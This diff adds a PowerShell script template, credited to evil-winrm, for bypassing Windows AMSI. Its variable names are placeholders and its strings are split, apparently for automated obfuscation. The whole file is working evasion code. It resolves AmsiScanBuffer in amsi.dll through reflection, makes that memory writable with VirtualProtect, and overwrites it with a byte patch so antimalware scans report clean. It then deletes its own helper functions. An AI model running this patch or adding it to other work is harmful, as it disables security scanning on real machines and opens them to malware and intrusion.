@@ -1,0 +1,67 @@
+# Bypass-4MSI from github.com/Hackplayers/evil-winrm
+# All credit goes to the original authors.
+function >><FUNCTION1>>< {
+    Param (>><VAR1>><, >><VAR2>><)
+    >><VAR3>>< = ([AppDomain]::CurrentDomain.GetAssemblies() |
+    Where-Object { 
+        $_.GlobalAssemblyCache -And $_.Location.Split(""+<><\<><+"")[-1].Equals(""+<><System.dll<><+"")
+     }).GetType("Microsoft."+<><Win32.Un<><+"safeNativeMethods")
+    >><VAR4>><=@()
+    >><VAR3>><.GetMethods() | ForEach-Object {
+        If($_.Name -like "Ge*P*oc*"+<><ddres<><+"s") {
+            >><VAR4>><+=$_
+        }
+    }
+    return >><VAR4>><[0].Invoke($null, @((>><VAR3>><.GetMethod(""+<><GetM<><+"odul"+<><eHan<><+"dle")).Invoke($null, @(>><VAR1>><)), >><VAR2>><))
+}
+#jump
+
+function >><FUNCTION2>>< {
+    Param (
+     [Parameter(Position = 0, Mandatory = $True)] [Type[]] >><VAR5>><, [Parameter(Position = 1)] [Type] >><VAR6>>< = [Void]
+    )
+    >><VAR12>>< = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
+        (New-Object System.Reflection.AssemblyName(""+<><Ref<><+"lec"+<><tedDe<><+"legate")),
+        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
+    ).DefineDynamicModule(
+        ""+<><InM<><+"emo"+<><ry<><+"Module",
+        $false
+    ).DefineType(
+        $(""+<><MyDelegateType<><+""),
+        "Class, Public, Sealed, AnsiClass, AutoClass",
+        [System.MulticastDelegate]
+    )
+
+    >><VAR12>><.DefineConstructor(
+        "RTSpecialName, HideBySig, Public",
+        [System.Reflection.CallingConventions]::Standard, >><VAR5>><
+    ).SetImplementationFlags("Runtime, Managed")
+
+    >><VAR12>><.DefineMethod(
+        "Invoke",
+        "Public, HideBySig, NewSlot, Virtual",
+        >><VAR6>><,
+        >><VAR5>><
+    ).SetImplementationFlags("Runtime, Managed")
+    
+    return >><VAR12>><.CreateType()
+}
+#jump
+[IntPtr]>><VAR7>>< = >><FUNCTION1>>< $(""+<><amsi.dll<><+"") $(""+<><AmsiScanBuffer<><+"")
+#jump
+>><VAR8>>< = 0
+#jump
+>><VAR9>><=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    (>><FUNCTION1>>< $(""+<><kernel32.dll<><+"") VirtualProtect), 
+    (>><FUNCTION2>>< @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool]))
+)
+#jump
+>><VAR10>>< = >><VAR9>><.Invoke(>><VAR7>><, 3, 0x40, [ref]>><VAR8>><)
+#jump
+>><VAR11>>< = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
+#jump
+>><VAR10>>< = [System.Runtime.InteropServices.Marshal]::Copy(>><VAR11>><, 0, >><VAR7>><, 12)
+#jump
+Remove-Item Function:>><FUNCTION2>><
+#jump
+Remove-Item Function:>><FUNCTION1>><
